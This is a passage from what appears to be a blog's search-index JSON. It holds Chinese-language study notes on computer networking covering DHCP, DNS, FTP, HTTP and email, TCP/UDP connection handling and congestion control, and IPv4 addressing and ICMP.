配置信息包括：IP地址（使用ARP检测确保该IP未被网络中的其他主机占用）、子网掩码、地址租期、默认网关、DNS服务器      挑选一个（先到的）报文作为自己的DHCP，发送 DHCP请求报文征求其同意：                  目的地址255.255.255.255：告知所有的DHCP，我挑选到它啦          源地址0.0.0.0：现在未获得DHCP服务器的同意          报文内容：事务ID、DHCP客户端的MAC地址、接受租约的IP地址、提供租约的DHCP服务端IP地址等                          ACK 最终确认    服务端回复是否同意租约          目的地址：255.255.255.255      源地址：DHCP服务器            客户端收到确认后，使用ARP检测所分配的IP地址是否被网络其他主机占用          若未被占用，客户端可以开始使用该IP地址      若被占用，                  给DHCP服务器发送 DHCP decline报文撤销IP地址租约          重发 DHCP discover报文寻找方案                          续约 当租期过半时                  客户端请求续约 DHCP request                  源地址：租用的地址          目的地址：DHCP服务器                    服务器不同的反应                  若同意续约 DHCP ACK，得到新的租期          若不同意续约 DHCP NACK，客户端必须立即停用租用的IP地址并重新发送 DHCP discover          若不响应，客户端等待一段时间                    等待到0.875 = 7/8的租期时间，客户端必须重新发送 续约 DHCP request      等待到租期结束，客户端必须停用租用的IP地址并重新发送 DHCP discover            解约 客户端可以随时放弃租用的IP地址，向提供DHCP服务器发送 DHCP release释放报文即可  中继代理​\t某个网络拓扑中没有DHCP服务器，其客户端法发送的 DHCP discover请求使用广播地址255.255.255.255不能经过普通路由器转发而是丢弃，内部又没有可以相应其DHCP请求的服务，导致该网络拓扑中的主机无法自动获取网络配置信息。​\t解决办法，为该路由器配置DHCP服务器的IP地址使之成为 DHCP中继代理​\t路由器收到广播的DHCP discover报文后，会单播转发给其他网络拓扑中存在的DHCP服务器，此后都如此交互​\t使每个网络不必都配置DHCP服务器，至少有一个即可DNS​\t域名系统（Domain Name System），将域名翻译为IP地址寻址​\t每台用户主机都需要经过DNS查找域名对应的IP地址，故DNS服务器不能只有一台，它应该在本地解析或一个分布式服务器集群​\t因特网使用层次结构命名树 + 分布式域名系统，大多数域名在本地解析域名空间​\t1. 各级域名：由若干个分量，以.隔开，分别代表不同级别的域名​\t\t每一级域名（&lt; 63个字符）有 英文（不区分大小写） + 数字 ，完整域名 &lt; 255个字符​\t\t···.三级域名.二级域名.顶级域名 右边大，各级域名由其上级机构管理；顶级域名由因特网名称与数字分配机构ICMN管理  顶级域名TLD（Top Level Domain）分为三类          国家顶级域名nTLD：ISO 3166规定      通用顶级域名gTLD：常见七个（com公司企业、net网络服务机构、org非营利性组织、int国际组织、edu美国教育机构、gov美国政府部门、mil美国军事部门）      反向域名arpa：用以反向域名解析，即IP地址 → 域名        二级域名          由国家自行规定      分为两类                  类别域名：七个（ac科研机构、com工商金融等企业、edu教育机构、gov政府部门、net提供网络服务机构、mil军事机构、org非盈利组织）          行政区域名：34个，分配给各省、自治区、直辖市                      便于维护名字的唯一性，易查询；逻辑概念，而非物理地点域名服务器​\t分布式实现  根 域名服务器          分布式构成的13个根域名服务器，是高层的域名服务器      不直接对域名解析，而是提供该域名所在的 顶级服务器IP地址        顶级 域名服务器          管理该顶级域名下的 二级域名      返回下一级权限服务器的IP地址        权限 域名服务器          管理某个区的域名，主机必须所管辖服务器注册登记      管辖的域名与IP地址的映射关系；下级服务器的地址        本地 域名服务器          主机第一个经过的域名服务器，起着代管作用，对其转发      距离主机距离较近，一般四五个路由器      域名解析解析过程      递归查询    直接一级一级向下查询，本地 – 根 – 顶级 – 权限，获得结果就往回传递        迭代查询    每向一节查询，拿着结果，向另一级查询。    本地 – 跟 = 顶级IP；本地 – 顶级IP = 权限IP；本地 – 权限 = 目标IP；本地服务器将目标IP交给主机  递归查询对被查询的域名服务器负载要求大，所以采用两者相结合：  主机 – 本地：递归查询  本地 – 其余服务器：迭代查询解析原理（？）DNS指针查询（反向查找、逆向解析）的基本原理DNS缓存​\t为提高查询效率，减少查询报文数量，减轻服务器负荷​\t域名服务器广泛使用 高速缓存，存放最近查询过的域名、何处获取的域名映射信息记录​\t本地主机也需要维护好 域名：IP地址数据库​\t缓存为每项内容设置计时器，并删除超过合理时间的项FTP​\t文件传输协议（File Transfer Protocol）  交互式访问，允许指明文件类型与格式、文件存取权限（授权、口令）  屏蔽计算机系统细节，适用于异构网络中任意计算机之间基本工作原理两种不同的传输模式主动模式      服务器监听 熟知端口号21，等待客户发起FTP连接        控制连接：建立TCP连接，用于传送FTP相关控制命令，即命令通道        如果有数据传输，客户端通过命令通道告知服务器：需要开放另一条TCP连接，作为数据通道        数据连接：服务器开放 熟知端口号`20`，向客户发起FTP连接（主动模式），用于传输FTP文件  被动模式  控制连接一样  如果有数据传输，客户端通过命令通道告知服务器：需要开放另一条TCP连接，作为数据通道  数据连接：服务器开启 临时端口（双方协商好的端口号），被动等待客户连接（被动模式），建立数据通道两个TCP连接并行：​\t控制连接需要在绘话期间一直保持打开；​\t数据连接在每次文件传输时建立，结束时结束客户端的接口都是随机的？  控制连接 + 数据连接（为什要？  两种工作模式：PASV + PORT      指令和响应码    断电续传 + 匿名FTP万维网WWW​\tworld wide web，运行在Internet中的分布式应用，而非某种特殊的计算机网络​\t利用超链接，将不同网站的网页连接统一资源定位符URL：&lt;协议&gt;://&lt;主机&gt;:&lt;端口&gt;/&lt;路径&gt;连接方式两种：  非持续连接          HTTP / 1.0      每次请求就建立TCP连接，收到响应后立即关闭连接      请求一个WWW文档时间 = 2RTT + 文档传送时延      为减少时延，通常会建立多个并行TCP同时请求多个对象；但占用服务器资源        持续连接          HTTP / 1.1      同一个浏览器与该服务器的TCP连接可以继续传送请求和响应      流水线模式：收到响应之前连续发送多个请求，而后服务器一个接一个响应      非流水线模式：只有上一个请求被响应后才可以发送下一个请求      HTTP报文格式HTTP是 面向文本，报文的每一个字段都是一些ASCII码率，且长度不确定请求格式（+各种字段）  请求行          指明方法：GET POST PUT      资源地址：URL      HTTP 版本        首部行          Connect：close — 告诉服务器发送完请求文档后可释放连接      User-Agent：Mozilla/5.0 — 告诉服务器 浏览器使用的类型和版本      Accept-Language：cn — 告诉服务器 用户希望优先得到中文版本的文档                  方法      描述                  HEAD      请求URL标志的文档首部              CONNECT      用于代理服务器              OPTIONS      请求一些选项信息              TRACE      用来进行环回测试                                    GET      请求URL标志的文档              POST      向服务器发送数据              PUT      在指明的URL下存档一个文档              DELETE      删除URL标志的文档              PATCH      对PUT方法补充，对已知资源进行局部更新      响应（+各种字段）            状态码      （五大类，33种）描述                  1XX      表示通知信息，如：请求收到了、正在进行处理              2XX      表示成功，如：接受了、知道了              3XX      表示重定向，即要完成请求还必须采取进一步的行动              4XX      表示客户的差错，如：请求中有错误的语法、或不能完成              5XX      表示服务器的差错，如：服务器失效无法完成请求      Cookie​\tHTTP为无状态协议，使用Cookie对其进行状态化的技术  双方建立TCP连接成功时，服务器为用户生成唯一的cookie识别码Set-Cookie  用户端将Cookie信息存放到文档  每次用户端发送请求，读取Cookie码并将其携带上  服务器根据Cookie码识别用户，并返回个性化页面HTTPS（？  详细握手过程  摘要算法、数字签名、数字证书的原理和过程电子邮件​\t电子邮件系统上采用 客户/服务器方式，有三个部件构成：用户代理，邮件服务器，电子邮件所需的协议  用户代理：用户与电子邮件系统的接口，又称 电子邮件客户端软件  邮件服务器：          电子邮件系统的基础设施，Internet所有的ISP（Internet Service Provider，互联网服务提供商）都有邮件服务器      其功能是发送和接受邮件，维护用户的邮箱        协议：邮件发送协议（SMTP）+邮件读取协议（POP3，IMAP）邮件协议的使用范围SMTPSMTP 与 MIME  SMTP协议          只能传送ASCII码文本数据，不能传送可执行文件或其他的二进制对象。      不能满足传送多媒体邮件（例如带有图片、音频或视频数据）的需要。      许多其他非英语国家的文字（例如中文、俄文、甚至带有重音符号的法文或德文）也无法用SMTP传送。        MIME（多用途因特网邮件扩展，Multipurpose Internet Mail Extensions）          为解决SMTP传送非ASCII码文本的问题，      增加了5个新的邮件首部字段，这些字段提供了有关邮件主体的信息。      定义了许多邮件内容的格式，对多媒体电子邮件的表示方法进行了标准化。      定义了传送编码，可对任何内容格式进行转换，而不会被邮件系统改变。      实际上，MIME不仅仅用于SMTP，也用于后来的同样面向ASCII字符的HTTP基本工作原理信息格式邮件读取协议​\t都使用基于TCP连接的客户/服务器方式POP 邮局协议​\tPost Office Protacol，是Internet的正式标准。  非常简单，功能有限  用户只能 下载+删除、下载+保留的方式 获取邮件到计算机  不允许用户在邮件服务器上管理自己的邮件  熟知端口110IMAP Internet邮件访问协议​\tInternet Message Access Protocol，是Internet的建议标准  功能强大，是一个联机协议  用户可以在计算机上操作邮件服务器的邮箱  熟知端口143基于万维网的电子邮件​\t通过浏览器 → 邮件服务器万维网，撰写、收发、阅读和管理；无需安装软件TCP 区分应用进程；实现可靠传输添加ETH 使之成为（以太网）帧帧：目的地址 + 源地址 + 类型 + 包 + 4字节校验码前导码：1字节帧开始界定符 + 7字节前同步码 让目的主机做好接受帧的准备"
  },
  
  {
    "title": "5. 运输层",
    "url": "/posts/5.%E8%BF%90%E8%BE%93%E5%B1%82/",
    "categories": "计算机网络",
    "tags": "computerNetwork",
    "date": "2022-06-16 00:00:00 +0800",
    





    
    "snippet": "​\t主机到主机的通信：物理层 + 数据链路层 + 网络层​\t主机进程间的通信：传输层​\t如果为运行在不同主机的 应用进程的逻辑通信提供直接通信服务，又称为端到端协议（端口）​\t向上层隐藏下面的网络服务核心细节，提供两种不同的运输协议  面向连接的TCP  面向无连接UDP端口号​\t进程标识符PID，不同OS、不同进程的表示格式不同，使用统一的方法对TCP/IP体系的应用进程标识​\t16bit...",
    "content": "​\t主机到主机的通信：物理层 + 数据链路层 + 网络层​\t主机进程间的通信：传输层​\t如果为运行在不同主机的 应用进程的逻辑通信提供直接通信服务，又称为端到端协议（端口）​\t向上层隐藏下面的网络服务核心细节，提供两种不同的运输协议  面向连接的TCP  面向无连接UDP端口号​\t进程标识符PID，不同OS、不同进程的表示格式不同，使用统一的方法对TCP/IP体系的应用进程标识​\t16bit表示，取值范围0~65535；      熟知端口号：0~1023；FTP 21/20; HTTP 80; DNS 53        登记端口号：1024~49151；必须登记手续        短暂端口号：49152~65535；动态端口号    【端口号只具有本地意义】不同OS、不同进程的端口号之间没有联系    复用：多个线程利用一个 IP+端口 发送信息称为 复用；  分用：多个线程利用一个 IP+端口 接收信息成为 分用；UDP​\tUser Datagram Protocol 用户数据报协议  无连接的 — 支持单播、多播以及广播  面向应用报文：          以报文为单位      对应用层传输下来的报文既不合并也不拆分，保留报文的边界        不可靠服务          运输层、网际层都是向上提供无连接、不可靠的传输服务      当报文出现误码、丢失时，接收方仅丢弃而什么都不做        适用于IP电话、视频会议、直播等实时应用数据报格式​\t首部（仅8字节） + 数据部分TCP​\tTransmission Control Protocol 传输控制协议  面向连接（逻辑上的连接，物理上仍然是无连接）— 仅支持单播  面向数据流：          传送字节流      不保证一次传完、只保证传输数据一致；      要求应用层有能力处理乱序字节流、多次传输的数据流拼接完整还原        可靠的服务          网际层可能出现传输差错，但TCP可以使其差错重传      不会出现传输差错      数据报格式  源端口、目的端口：          各16bit，用于识别发送、接受该TCP报文段的应用进程      源端口：填写暂时端口号（？      目的端口：填写该应用的熟知端口号（？        序号：          32bit，增加到最后一个后又从0开始      指出本TCP报文段数据载荷的第一个字节序号        确认号：          32bit，增加到最后一个后又从0开始      指出希望收到下一个数据载荷的第一个字节的序号；对之前收到的数据进行确认，收到数据的最后一个字节号+1      ！需要搭配 标志位 ACK使用：                  ACK=1时才有效，ACK=0时无效          TCP规定，在建立连接后TCP报文段必须把 ACK=1                      数据偏移：          4bit，以4字节为单位      指出 数据载荷的起始 距离 TCP报文段的起始 处有多远      指出TCP报文的首部长度                  首部固定长度为20字节，数据偏移量min = (0101) ~2~ = 5*4          首部最大长度为60字节，数据偏移量max = (1111) ~2~ = 15*4                      窗口：          16bit，以字节为单位      指出 发送本报文段的一方 的接受窗口      根据接收方的接受能力 控制 发送方的发送能力，即流量控制      接收方 让 发送方 设置其发送窗口的依据之一：[拥塞窗口，接受窗口]~min~        校验和          16bit，检查 TCP报文段的首部 + 数据载荷 两个部分      校验方式与UDP一样        标识符          SYN：建立连接的同步符      FIN：释放连接的终止符      RST：复位TCP连接                  表示连接出现异常，必须释放后重新建立连接          拒绝非法报文段 、 拒绝打开一个TCP连接                    PSH：推动标志位，该报文尽快推送上交应用进程，而不必等待接收缓存填满再上传      URG：紧急标志位，搭配 紧急指针使用                  URG=1，紧急指针有效；URG=0，紧急指针无效          发送方有紧急数据时，可插队到发送缓存的最前面，并立即封装一个TCP段发送          紧急指针：数据载荷有多长的紧急数据，紧急数据之后的普通数据          接收方根据紧急指针取出紧急数据，直接上交应用进程，而不必等待接收缓存填满再上传                      选项（可选）          最大报文段长度MSS选项：TCP报文的数据载荷最大长度      窗口扩大选项：为扩大窗口（提高吞吐率）      时间戳选项：                  计算往返时间RTT          处理序号超范围情况，又称为凡是序号绕回PAWS                    选择确认选项        填充：使整个首部长度能被4整除，数据偏移字段以4字节为单位连接控制​\tTCP面向连接，三个阶段  建立连接（三次握手）  数据传送  释放连接（四次挥手）三次握手 — 连接  解决问题：          确知对方的存在，协商参数（窗口值max，是否使用时间戳选项一级服务质量等）      双方对运输实体资源（缓存大小、连接表中的项目）进行分配        双方先建立传输控制块：          TCP连接表      指针：发送和缓存的、重传队伍的      当前发送和接受的序号        服务器等待客户端的连接，成为被动打开连接  客户端主动发起的连接，称为主动打开连接      三次握手：    在不可靠网络信道中建立可靠的连接                  你听见我在说话了吗？（客户端发送SYN=1,seq=x，进入SYN-SENT同步已发送状态）        （SYN=1：不允许携带数据，但要消耗一个序号；seq=x：客户端进程所选择的初始序号；）                    我听见了，你能听见我在说话吗？（服务端回复SYN=1,ACK=1,seq=y,ack=x+1,进入SYN-RCVD同步已接收状态）        （SYN=1,ACK=1：TCP连接请求确认报文，不允许携带数据，但要消耗一个序号；）        （seq=y：服务器进程所选择的初始序号；ack=x+1：对客户端初始序号确认）                    我听见了你在说话了（客户端回复ACK=1,seq=x+1,ack=y+1，进入establish连接已建立状态）        （ACK =1：普通的确认报文；seq=x+1：请求连接报文已消耗掉一个序号；ack=y+1：对服务器初始序号的确认）        （TCP规定：普通的确认报文段可以携带数据，如不携带则不消耗序号；则下一个报文序号仍为x+1）                    双方开始通话（服务器收到确认报文，也进入establish链接已建立状态）                  为什么不使用两次握手？    防止已经出错的请求报文突然又传给服务器，而引起的错误                  你听到我在说话了吗？（客户端第一次发送SYN，滞留或丢失）                    无回复                    （客户端重新发送SYN包）你听到我在说话了吗？                    我听见了，我们开始聊天吧！（服务端正常收到，并回复SYN + ASK）        （二次握手成功，双方开始建立连接）                    第一次发送的SYN突然恢复，会出现两种情况                  双方正在连接，此时服务端以为客户端请求新的连接，发送回复SYN + ASK建立两次握手后，进入等待数据状态；服务端建立两个连接，而客户端只认可一个连接，导致状态不一致。          双方已释放连接，服务器以为客户端重新请求连接，发送回复SYN + ASK建立两次握手后，而进入等待数据状态；客户端无连接请求，将不会回复数据。            四次挥手 – 释放                                服务器等待客户端的释放，成为被动关闭  客户端主动发起的释放，称为主动关闭      我客户端说完了，要撤咯（客户端发送FIN=1,ACK=1,seq=u,ack=v，进入FIN-WAIT-1终止等待状态）    （FIN=1：即使不携带一个数据，也要消耗一个序号）    （seq=u：客户端最后已发送的最后一个字节序号+1；ack=v：客户端最后已收到的最后一个字节序号+1）        知道了，我服务端还有话要说点（服务器发送确认报文ACK=1,seq=v,ack=u+1，进入CLOSE-WAIT关闭等待状态）    （普通的确认报文段， 服务器通知服务器进程关闭链接；）    （seq=v：服务器最后已发送的最后一个字节序号+1；ack=u+1：服务器最后已收到的最后一个字节序号+1）    （客户端收到报文，进入FIN-WAIT-2终止等待状态）    （两端的应用进程方向连接释放，进入 半关闭状态：客户进程无话要说，服务器进程可能有话要说，客户仍要开放接收）        我服务端讲完了，听见没啊？（服务器发送FIN=1,ACK=1,seq=w,ack=u+1，并进入LAST-ACK最后确认状态）    （FIN=1,ACK=1：TCP连接释放报文，seq=w：半关闭状态下可能发送的数据序号，ack=u+1：对收到的报文进行重复确认）        嗯嗯，听到你说的话了，等你先挂电话（客户端发送ACK=1,seq=u+1,ack=w+1，并进入TIME-WAIT超时等待状态）    （普通的确认报文段，seq=u+1：客户端之前已发送的序号，fin消耗掉一个序号；ack=w+1：客户端收到的序号确认）    （服务器收到报文，立即关闭连接，进入closed关闭状态）        （客户端超时等待结束，关闭连接）  超时等待状态  为确保服务器端已收到ACK包；时间=2MSL，最长报文段寿命的两倍（一个来回）  ACK丢包！服务器会重新发送FIN包： 喂？喂？喂！          客户端在超时等待中可捕获到这个包，而重新第四次挥手      立即断开连接，客户端无法捕获这个FIN包，没有第四次成功挥手，将会使得服务器一直处于连接状态      保活计时器​\t【情景】客户端出现故障。服务端不会再收到信息，如果及时发现对方已下线？  服务器维护一个 保活计时器  客户端 → 服务器，服务器就重启保活计时器（2h）  保活计时器到时候，服务器 → 客户端发送 探测报文段；之后的75s/次，一连10次仍然没有响应，关闭连接数据确认为解决丢包、乱序问题      为每一个连接建立 发送缓冲区，建立连接后的第一个字节序列号为0，此后序列号 + 1        发送报文格式：取其数据序列号 + 长度 + 数据内容        确认报文格式：ACK = 序列号 + 长度 = 下一包起始序列号    （可以连续发送多个发送报文，接收端只需回复一次ACK就可以）    （收到ACK确认报文，发送端可将已接受字段删除）        切割发送：根据序列号+长度重组 = 数据内容        丢失重发：ACK = 丢失报文的序列号    【全双工：以上过程部区分客户端、服务端】  流量控制​\tFlow Control, 让发送方的发生效率不要太快，让接收方 来得及 接受；滑动窗口​\t依靠滑动窗口实现 可靠传输  发送窗口和接受窗口并不重视一样大          网络传输窗口值有一定的滞后      发送方可根据自身情况修改发送窗口        不按序到达的数据，TCP无明确规定          接收方一律丢弃，管理简单但浪费资源，发送方需要重复发送数据      接收方暂存到接受窗口，等待数据齐全后，交付给上层的应用进程        接收方必须有 累计确认 和 捎带确认 机制          捎带确认：可以在有数据发送的时候，吧确认信息捎带      不应该过分推迟确认：每隔一个报文段就发送一个确认      不经常发送，因为很少要求经常同时向两个方向发送        TCP通信是全双工通信【举例】每个报文可携带100字节数据，将要发送的数据编号后以100为单位分割      建立TCP连接时，接收方B告诉发送方A：我的接收窗口为400    （A的发送窗口设置为400，在未收到B的确认，可将落入发送窗口的全部数据一直发送出去）        发送A发送1~100字节数据，seq=1,DATA，还能发送300        发送A发送101~200字节数据，seq=101,DATA，还能发送200        发送A发送201~300字节数据，seq=201,DATA(丢失)，还能发送100        接受B对1~200字节数据累计确认，并将接收窗口设置为300，ACK=1,ack=201,rwnd=300    （ACK确认标志符，ack确认了n字节数之前的数据，rwnd重置的窗口的大小。）    （:number1: B对A进行 流量控制）    （A向前滑动发送窗口，到ack确认的字节数后201；调整发送窗口的大小=300；丢弃发送缓存中已被确认接收的数据1~200）    （201~300字节已发送但没有收到确认，重传计时器开始计时）        发送A发送301~400字节数据，seq=301,DATA，还能发送100        发送A发送401~500字节数据，seq=401,DATA，还能发送0，不能再发送新数据    （重传计数器到点，开始重传旧数据；300窗口为丢失数据保留一个100发送，但不能再发送新数据了）        发送A发送201~300字节数据，seq=201,DATA，还能发送300        接受B对201~500字节数据累计确认，并将接收窗口设置为100，ACK=1，ack=501，rwnd=100    （:number2: B对A进行 流量控制）    （A向前滑动发送窗口，到ack确认的字节数后501；调整发送窗口的大小=100；丢弃发送缓存中已被确认接收的数据201~500）        发送A发送501~600字节数据，seq=501,DATA，还能发送0，不能再发送新数据        接受B对600之前的字节数据累计确认，并将接收窗口设置为100，ACK=1，ack=601，rwnd=0    （:number3: B对A进行 流量控制）    （A向前滑动发送窗口，到ack确认的字节数后601；调整发送窗口的大小=0；丢弃发送缓存中已被确认接收的数据501~600）  【窗口为0的确认】      当B接收缓存有了一些存储空间，于是发送我要调整窗口为300，但丢失了！    形成死锁：主机A等待B的非零窗口通知；主机B等待A的数据报文        A主动发送零窗口探测报文，携带1字节数据，询问接收方        每次A接收到0窗口报文后，启动持续计时器，超时时主动询问        B收到零窗口探测报文，需回复确认报文，并告知现在的窗口大小，ACK=1,rwnd=300    B接受缓存已满，可以不接受一般报文，但必须接受紧急报文、确认报文和零窗口探测报文  拥塞控制慢启动、拥塞避免  拥塞窗口cwnd：          值取决于 网络拥塞程度，并动态变化      维护原则：                  网络未出现拥塞，cwnd值就大一些；          网络一旦出现拥塞，cwnd值就小一些；                    发送方的发送窗口swnd = cwnd        网络拥塞的依据：没有按时收到应当到达的确认报文（发送超时重传）  两种控制的应用：慢开始门限 ssthresh          cwnd &lt; ssthresh，拥塞窗口 &lt; 慢开始门限 —- 使用慢开始算法（cwnd × 2）      cwnd &gt; ssthresh，拥塞窗口 &gt; 慢开始门限 —- 停止使用慢开始，而使用拥塞算法（cwnd + 1）      cwnd = ssthresh，拥塞窗口 = 慢开始门限 —- 可使用慢开始，也可使用拥塞算法        维护一个 慢开始门限 ssthresh          设置一个初始值      每次发生网络拥塞时                  拥塞窗口值cwnd / 2 = ssthresh          cwnd重置为初始值，并开始慢开始                    快速重传、快速恢复  不是所有的报文丢失由于网络拥塞导致的，当超时重传时判断是否为 网络拥塞          是网络拥塞，使用拥塞算法      不是网络拥塞，开启快重传、快恢复        快速重传：          要求接收方每次收到报文，都要对其及时确认      若收到失序的报文，对失序报文重复确认（确认报文只能确认最高序号）      同时保留失序的报文      发送方接受三次重复的报文确认                  网络未拥塞          一至两次重复确认，可能报文滞留在网络某处          三次确认可认为报文丢失，重发报文                      快速恢复：          启用快重传后，抛弃慢启动，使用快速恢复      ssthresh = cwmd / 2      cwmd = ssthresh      拥塞避免算法      超时重传超时时间选择​\t超时重传的时间ORT 应该略小于 一个报文段往返时间RTTO  过短：不必要的重传，网络拥塞  过长：不必要的等待，网络闲置  略？：经过不同速率的网络、不同数量的路由等等因素加权平均往返时间 RTTs – – 平滑的往返时间：多次测量的RTT样本加权平均加权平均往返时间 RTTs\t初始化：RTTs = RTT1\t新的RTTs1 = （1 - α）× RTTs1 + α × 新的RTT样本（0 &lt;= α &lt; 1，α=1/8=0.125）RTT偏差的加权平均RTTd\t初始化：RTTD = RTT1 ÷ 2\t新的RTTD = （1 - β ）× RTTD1 + β × |RTTs1 - 新的RTT样本| （0 &lt;= β &lt; 1，β=1/4=0.25）超时重传时间 RTO\tRTP = RTTs + 4 × RTTd      RTT的测量准确与否非常重要                  RTT的测量有难度：                  数据报文段丢失后重发。距离收到确认报文的时间，是第一次报文还是第二次报文？          数据未收到确认而重发。距离收到确认报文的时间，是第一次报文还是第二次报文？                            Karn算法：只要报文重传，就不采用其RTT样本，RTO也不会重新计算        （若报文时延突然增大且持续很久，RTO内不会收到确认报文，于是重发，而不更新RTO，将一直重发）                    修正Karn算法：报文重传，就把RTO增大一些（× 2）            "
  },
  
  {
    "title": "4. 网络层",
    "url": "/posts/4.%E7%BD%91%E7%BB%9C%E5%B1%82/",
    "categories": "计算机网络",
    "tags": "computerNetwork",
    "date": "2022-06-14 00:00:00 +0800",
    





    
    "snippet": "​\t实现网络互连，数据包在其之间的传输      向上层（运输层）提供怎样的服务？IP提供的是 面向无连接，不可靠服务        网络寻址问题：A类地址、B类地址、C类地址        路由选择问题：路由表 + 目的地址          路由表的数据来源：人工设置（小型，不改变）、路由选择协议中的选择算法        因特网，使用TCP/IP协议，网络层使用网际协议IP，由此TCP...",
    "content": "​\t实现网络互连，数据包在其之间的传输      向上层（运输层）提供怎样的服务？IP提供的是 面向无连接，不可靠服务        网络寻址问题：A类地址、B类地址、C类地址        路由选择问题：路由表 + 目的地址          路由表的数据来源：人工设置（小型，不改变）、路由选择协议中的选择算法        因特网，使用TCP/IP协议，网络层使用网际协议IP，由此TCP/IP中的网络层又称为网际层  提供的两种连接      面向连接的虚电路          可靠通信由网络来保障      建立网络层的连接——虚电路CV，沿着此电路发送分组      目的主机地址仅在建立初阶段使用，之后 首部只携带虚电路的编号      通信结束后，需要释放所建立的虚电路        虚电路 + 可靠传输协议 = 无传输差错          虚电路是一条逻辑上的电路，事实上不存在      电话交换的电话通信，是建立一条物理上的电路            无连接的数据报服务          可靠通信由用户主机来保障      不建立网络层练级——每个分组可走不同的路径      目的主机的完整地址需要时刻携带      可能出现传输差错，但造价低廉，适应性强        将复杂网络处理功能至于因特网边缘（用户主机和其内部的运输层）  IPv4​\t每一台主机（或路由器）的每个接口，分配唯一的32bit的识别符​\t点分十进制表示法，每8位分为一组分类编址方式  A类地址：8位（网络号）+ 24位（主机号）          网络号第一个比特值一定为0      最小网络号0，保留不指派                  0.0.0.0是一个特殊的网络地址，表示“在本网络上的本主机”，只能作为源地址使用                    最大网络号127，作为本地环回测试地址，不指派                  最小的：127.0.0.1          最大的：127.255.255.254                    可指派的网络地址1.0.0.0 - 126.0.0.0        B类地址：16位（网络号）+ 16位（主机号）          网络号第一二个比特值一定为10      最小网络号，也是第一个可指派的网络号 128.0      最大网络号，也是最后一个可指派的网络号 129.255      可指派的网络地址：128.0.0.0 - 191.255.0.0        C类地址：24位（网络号）+ 8位（主机号）          网络号第一二三个比特值一定为110      最小的网络号，也是第一个可指派的网络号 192.0.0      最大的网络号，也是最后一个可指派的网络号 223.255.255      可指派的网络地址：192.0.0.0 - 223.255.255.0        D类地址：多播地址  E类地址：保留今后使用  广播地址：255.255.255.255，表示“只在本网络进行广播”，只能作为目的地址使用子网划分      为什么要划分子网：          申请更多的IP地址，会导致路由表记录数量怎多      浪费原有网络中剩余的IP地址            子网地址计算    【例题】网络地址为218.75.230.0，使用子网掩码255.255.255.128对其子网划分。                  218.75.230.0：该网络为C类网络地址，前三个值为网络号，最后一位是主机号                    255.255.255.128：                  前三个255表示连续24个比特1，对应了网络号部分，                            128化为二进制表示一个比特1，即从主机号中借用了一个比特作为子网号                  划分的子网数量 2^1 = 2，每个子网可分配的地址数量2^（8-1 ) - 2=126    [去掉主机号全为0的网络地址、全为1的广播地址]        默认子网    在未划分子网的情况下使用子网掩码    网络号对应掩码全为1，主机号的对应掩码全为0  报文首部格式首部长度：4个字节  最大值为15：固定部分 20字节 + 可变部分 40字节  最小值为10：固定部分 20字节      IP数据报的首部长度一定是4的整数倍    区分服务          8bit，一般不使用      该字段的不同数值可提供不同等级的服务质量            总长度          首部长度 + 数据载荷            【标识 + 标志 + 片偏移：IP数据报分片】        生存时间：防止数据报在网络中兜圈 – 路由环路          以“时间”为计数，初始 - 当前路由花费的时间 = 剩余时间                  ＞0，转发；≤ 0，丢弃                    以“跳数”为计数，跳转指定次数                  ＞0，转发；≤ 0，丢弃                          协议                  8bit，数据部分是何种协议数据单元                    常用协议与字段值                      首部检验和          16bit，检验首部在传输过程是否出现差错      IP层本身不提供可靠传输服务，因而IPv6将不再进行校验        源IP地址和目的IP地址，各占32bit分片方式  为什么要分片：          IP数据报需要打包成帧，而帧长度受限于的最大传输单位MTU      当IP数据报长度 &gt; 帧，需要 分片 成更小的数据报文        标识：          16bit      同一个数据报的各分片应该具有相同的标识      IP软件维持一个计数器，每产生一个数据报计数器+1，赋值给标识字段        标志          3bit      DF位：（Don’t 分片？）                  1 – 不允许分片          0 – 允许分片                    MF为：（More 分片?）                  1 – 后面还有分片          0 – 这是最后一个分片                    保留位，必须设置为0        片偏移          13bit      分片数据报的数据载荷部分 在原数据报位置 偏移多少个位置      以8个字节为单位 – 数据载荷的第n个字符 / 8 （再次分片，第n遵循最初的位置）      选路？ICMP​\t为提高IP数据报 转发和交付成功的概率，在网际层使用网际控制报文协议Internet control message protocol​\t被封装在IP数据报中发送​\t应用场景：  分组网间探测PING          测试主机间的连通性      应用层直接使用网际层的ICMP（而不ton过运输层的TCP和UDP）      使用ICMP的回送请求和回答请求        跟踪路由          测试IP数据报经过哪些路由传递      Windows系统                  tracect命令          应用层直接只用网际层ICMP          ICMP回送请求、回答报文、差错报文                    Unix版本                  traceroute命令          在运输层使用UDP协议          只使用了差错报文                    查询报文2种  回送请求和回答：          请求报文：向特定主机发出询问      回答报文：收到请求的主机必须回复      测试目的站是否可达+状态        时间戳请求和回答          请主机回答当前的日期和时间      时钟同步和测量时间      差错报文5种  终点不可达：目的主机、路由不能交付数据报  源点抑制：目的拥塞而丢弃报文，通知源点数据发送速率放慢  时间超过：          路由因TTL &lt; 0而丢弃报文时，要通知源点      规定时间内没有收到一个报文的全部报片，会将已收到的全部丢弃，并通知源点        参数问题：首部检验与字段发现传输中出现误码，丢弃且通知源点  改变路由（重定向）：路由路径有更优解时不可发送差错报文的情况：  对ICMP差错报文 不再发送 差错报文          对第一个分片的数据报片的所有后续数据报片 都不再发送差错报文      对具有多播地址的数据报 都不发送ICMP差错报文      对特殊地址的数据报 不发送差错报文      ARP？"
  },
  
  {
    "title": "3. 链路层",
    "url": "/posts/3.%E9%93%BE%E8%B7%AF%E5%B1%82/",
    "categories": "计算机网络",
    "tags": "computerNetwork",
    "date": "2022-06-13 00:00:00 +0800",
    





    
    "snippet": "链路层  链路（Link）：两个结点间的物理线路  数据链路：把实现通信协议的硬件和软件，加到链路上  封装成帧：加上帧头 帧尾  差错检测：帧尾的检验码  可靠传输：接收方发现帧验证错误，丢弃该帧而不接受广播通道链路：将目标地址、源地址写入帧头共享式局域网信号碰撞问题：接入控制协议 CSMA/CD封装成帧            1字节      1字节      1字节      2字节 ...",
